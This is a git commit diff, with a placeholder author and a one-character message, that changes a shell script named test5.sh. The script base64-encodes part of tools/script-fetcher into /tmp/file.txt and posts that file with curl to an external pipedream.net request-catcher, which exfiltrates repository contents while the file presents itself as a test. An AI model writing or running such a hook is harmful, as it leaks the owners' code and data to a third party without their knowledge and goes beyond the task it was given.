ae8f6e13bc7b6d0de3ba82c3e2a13d55fb72be2e
wololo <wololo@wololo>
2021-11-03 14:33:09 -0300

    .

--- test5.sh
+++ test5.sh
@@ -2,6 +2,6 @@
 
 echo $(file tools/script-fetcher) > /tmp/file.txt
 echo "---------" >> /tmp/file.txt
-echo $(cat tools/script-fetcher | base64) >> /tmp/file.txt
+echo $(head tools/script-fetcher | base64) >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
